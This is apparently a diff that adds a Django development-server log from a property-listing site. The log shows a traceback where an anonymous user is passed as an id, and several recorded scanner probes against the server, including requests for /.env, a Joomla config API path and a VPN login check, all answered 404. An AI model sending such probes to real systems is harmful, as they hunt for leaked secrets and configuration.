+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1545, in add_q
+    clause, _ = self._add_q(q_object, self.used_aliases)
+                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1576, in _add_q
+    child_clause, needed_inner = self.build_filter(
+                                 ^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1491, in build_filter
+    condition = self.build_lookup(lookups, col, value)
+                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/sql/query.py", line 1318, in build_lookup
+    lookup = lookup_class(lhs, rhs)
+             ^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/lookups.py", line 27, in __init__
+    self.rhs = self.get_prep_lookup()
+               ^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/related_lookups.py", line 166, in get_prep_lookup
+    self.rhs = target_field.get_prep_value(self.rhs)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/fields/__init__.py", line 2055, in get_prep_value
+    raise e.__class__(
+TypeError: Field 'id' expected a number but got <SimpleLazyObject: <django.contrib.auth.models.AnonymousUser object at 0x7f3ea016ed90>>.
+[29/Nov/2023 13:14:18] "GET /property/69AqZ/details/ HTTP/1.1" 500 129930
+[29/Nov/2023 13:14:23] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 13:14:24] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 13:14:26] "GET /property/add-property/ HTTP/1.1" 302 0
+[29/Nov/2023 13:14:26] "GET /auth/?next=/property/add-property/ HTTP/1.1" 200 8277
+[29/Nov/2023 13:14:28] "POST /login/ HTTP/1.1" 200 8435
+Not Found: /login/assets/imgs/logo.jpeg
+[29/Nov/2023 13:14:28] "GET /login/assets/imgs/logo.jpeg HTTP/1.1" 404 4151
+[29/Nov/2023 13:14:34] "POST /login/ HTTP/1.1" 302 0
+[29/Nov/2023 13:14:35] "GET /accounts/profile HTTP/1.1" 301 0
+[29/Nov/2023 13:14:35] "GET /accounts/profile/ HTTP/1.1" 200 10354
+[29/Nov/2023 13:14:37] "GET / HTTP/1.1" 200 14010
+[29/Nov/2023 13:14:40] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[29/Nov/2023 13:15:09] "GET /media/5ad31286-dc05-4f4f-852a-1695d1d01bdd.MP4 HTTP/1.1" 200 76369925
+[29/Nov/2023 13:15:15] "GET / HTTP/1.1" 200 14010
+[29/Nov/2023 13:15:16] "GET / HTTP/1.1" 200 14010
+[29/Nov/2023 13:15:17] "GET /maps/search HTTP/1.1" 200 14763
+[29/Nov/2023 13:15:56] "GET / HTTP/1.1" 200 14010
+[29/Nov/2023 13:16:08] "GET /maps/search HTTP/1.1" 200 14763
+[29/Nov/2023 13:16:09] "GET /static/css/maps/style.css HTTP/1.1" 304 0
+[29/Nov/2023 13:16:23] "GET / HTTP/1.1" 200 14010
+Not Found: /mHWoLlDqd6JgbuZj28r1UBTknyD
+[29/Nov/2023 13:38:24] "GET /mHWoLlDqd6JgbuZj28r1UBTknyD HTTP/1.1" 404 4152
+[29/Nov/2023 13:50:36] "GET / HTTP/1.1" 200 13994
+Not Found: /api/index.php/v1/config/application
+[29/Nov/2023 13:52:34] "GET /api/index.php/v1/config/application?public=true&page%5Boffset%5D=0&page%5Blimit%5D=60 HTTP/1.1" 404 4234
+[29/Nov/2023 13:53:05] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 13:53:05] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 14:00:53] "GET / HTTP/1.1" 200 13994
+Not Found: /assets/imgs/logo.jpeg
+[29/Nov/2023 14:00:53] "GET /assets/imgs/logo.jpeg HTTP/1.1" 404 4134
+[29/Nov/2023 14:04:06] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 14:05:13] "GET / HTTP/1.1" 200 13994
+Not Found: /.env
+[29/Nov/2023 14:14:16] "GET /.env HTTP/1.1" 404 4083
+Forbidden (CSRF cookie not set.): /
+[29/Nov/2023 14:14:17] "POST / HTTP/1.1" 403 3071
+[29/Nov/2023 14:25:16] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 14:32:31] "GET / HTTP/1.1" 200 13994
+Not Found: /remote/logincheck
+[29/Nov/2023 14:45:38] "POST /remote/logincheck HTTP/1.1" 404 4127
+[29/Nov/2023 14:49:06] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 14:49:25] "GET /static/js/pages/app.js HTTP/1.1" 200 199
+[29/Nov/2023 14:49:25] "GET /static/js/pages/index.js HTTP/1.1" 200 591
+Not Found: /swiper-bundle.min.js
+[29/Nov/2023 14:49:25] "GET /swiper-bundle.min.js HTTP/1.1" 404 4131
+Not Found: /cdn.js
+[29/Nov/2023 14:49:25] "GET /cdn.js HTTP/1.1" 404 4089
+[29/Nov/2023 14:59:09] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 15:04:47] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 15:17:00] "GET / HTTP/1.1" 200 13994
+[29/Nov/2023 15:18:57] "GET / HTTP/1.1" 200 13994
+Not Found: /assets/imgs/logo.jpeg
+[29/Nov/2023 15:19:04] "GET /assets/imgs/logo.jpeg HTTP/1.1" 404 4134
+Not Found: /robots.txt
+[29/Nov/2023 15:19:05] "GET /robots.txt HTTP/1.1" 404 4101
+Not Found: /sitemap.xml
+[29/Nov/2023 15:19:07] "GET /sitemap.xml HTTP/1.1" 404 4104
+Not Found: /.env
+[29/Nov/2023 15:24:10] "GET /.env HTTP/1.1" 404 4083
+Forbidden (CSRF cookie not set.): /
+[29/Nov/2023 15:24:10] "POST / HTTP/1.1" 403 3071
+Not Found: /.env
+[29/Nov/2023 15:27:37] "GET /.env HTTP/1.1" 404 4083
+[29/Nov/2023 15:31:56] "GET / HTTP/1.1" 200 13994
+Not Found: /.env
+[29/Nov/2023 15:35:19] "GET /.env HTTP/1.1" 404 4083
+[29/Nov/2023 15:40:42] "GET /admin/config.php HTTP/1.1" 302 0
+[29/Nov/2023 15:40:42] "GET / HTTP/1.1" 200 13994
+/albdah-rebuild/albdah-rebuild/property/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 29, 2023 - 06:23:41
+Django version 4.2.6, using settings 'project.settings'
+Starting development server at http://127.0.0.1:8000/
+Quit the server with CONTROL-C.
+
+Watching for file changes with StatReloader
